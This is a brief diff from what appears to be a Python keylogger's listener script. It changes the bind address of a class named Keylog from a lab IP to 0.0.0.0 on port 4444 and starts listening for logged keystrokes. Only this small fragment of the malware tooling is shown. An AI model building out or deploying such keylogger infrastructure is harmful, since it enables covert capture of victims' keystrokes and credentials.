@@ -60,5 +60,5 @@ class Keylog():
             elif command == '2':
                 exit()
     
-listen = Keylog("10.0.2.4",4444)
+listen = Keylog("0.0.0.0",4444)
 listen.log_listen()
